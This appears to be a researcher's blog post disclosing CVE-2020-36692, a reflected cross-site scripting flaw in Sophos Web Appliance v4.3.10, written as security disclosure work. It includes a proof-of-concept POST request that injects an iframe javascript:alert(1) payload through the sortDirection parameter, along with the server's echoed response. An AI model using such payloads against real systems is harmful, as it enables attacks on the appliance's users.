---
layout: post
title:  "Cross-site scripting (XSS) in Sophos Web Appliance - v4.3.10"
date:   2023-04-30 19:51:02 +0700 
categories: [cve]
---

Vendor: Sophos

Product: Sophos Web Appliance

Version affected: v4.3.10

#### Product description:
The Sophos Web Appliance is designed to function as a web proxy that provides HTTP security at. the gateway. Potentially risky content is scanned for various forms of malware.

"Sophos Web Appliance (SWA) and Sophos Management Appliance (SMA) will reach End of Life (EOL) on 20 July 2023. When this happens, the products will continue to pass traffic but will no longer receive security or software updates. Cloud services with functions such as support services and LiveConnect will be turned off."

* CVE ID: CVE-2020-36692
* CWE ID: CWE-79

#### #Proof of Concept

Reflected cross-site scripting (XSS) vulnerability was discovered in the product.

A cross-site scripting vulnerability was identified.

It was possible to inject malicious code, I've successfully embedded a script in the response, which allowed me to execute it when the page loaded in the browser.

Tested on Firefox browser 76.0.1 (as of 15 May 2020, when it was reported to Sophos).

Vulnerable input section were possible to set to:
sortDirection and sortKey

The following Proof of Concept (PoC) demonstrates the attack as well as displaying evidence of the script payload being returned in the response. 

#### PoC:
{% highlight ruby %}
POST /index.php?c=report_scheduler HTTP/1.1
Content-Length: 116
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 10.0.0.15
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.6.1
Connection: keep-alive
Origin: https://10.0.0.15
Referer: https://10.0.0.15/index.php?c=report_scheduler&section=reports&STYLE=ea200102606123fe0ea40688110d6d0f
Accept: text/javascript, text/html, application/xml, text/xml, */*
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: en-US

action=load&sortKey=name&sortDirection=asc<iframe src=javascript:alert(1) &STYLE=4de217dd48aa30993948de8601493ef2&_=

HTTP/1.1 200 OK
Date: Fri, 15 May 2020 08:30:27 GMT
Server: Apache
Cache-Control: no-store, no-cache, must-revalidate, private, post-check=0, pre-check=0
Pragma: no-cache
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Content-Length: 144

{"sortKey":"name","sortDirection":"asc<iframe src=javascript:alert(1) ","schedulesJS":[],"schedulesList":"<ul id=\"table_entries_list\"><\/ul>"}
{% endhighlight %}

#### References:
1. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
2. https://support.sophos.com/support/s/article/KB-000039441?language=en_US
3. https://docs.sophos.com/nsg/swa/help/en-us/nsg/swa/concepts/AboutYourAppliance.html
4. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36692
5. https://www.sophos.com/en-us/security-advisories/sophos-sa-20230404-swa-rce                                                 
6. https://www.sophos.com/en-us/content/product-lifecycle                                              
